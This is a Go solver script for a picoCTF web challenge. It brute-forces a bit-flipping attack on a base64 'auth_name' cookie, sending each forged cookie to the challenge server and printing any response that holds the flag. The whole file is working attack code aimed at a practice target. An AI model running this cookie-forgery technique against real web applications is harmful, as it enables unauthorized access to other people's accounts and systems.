package main

import (
	b64 "encoding/base64"
	"fmt"
	"io"
	"net/http"
	"strings"
)

const authName = "dVZVQnpEUkFWWURhSHhueDRZSnpucWhnbUh5d2ptWG1GYlRyZzRKMi9SbUhYcVpZUHkyWkdicUFrQ2xXV01RSVBvMFVJeUtYR0RnM29sQzJVTXhYT2ZqUGt2aU11bVk2WkhpZnVtZ1dHV3BId1VtSnFTNEZQTXBxcEJEK3UvZms="

func flip(s string, position, bit int) string {
	b, _ := b64.StdEncoding.DecodeString(s)
	b[position] = b[position] ^ byte(bit)
	return b64.StdEncoding.EncodeToString(b)
}

func main() {
	for i := 0; i < 128; i++ {
		for j := 0; j < 128; j++ {
			flipped := flip(authName, i, j)

			req, err := http.NewRequest("GET", "http://mercury.picoctf.net:10868/", nil)
			if err != nil {
				panic(err)
			}
			req.AddCookie(&http.Cookie{Name: "auth_name", Value: flipped})

			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				panic(err)
			}
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				panic(err)
			}
			resp.Body.Close()

			if strings.Contains(string(body), "picoCTF") {
				fmt.Println(string(body))
			}
		}
	}
}
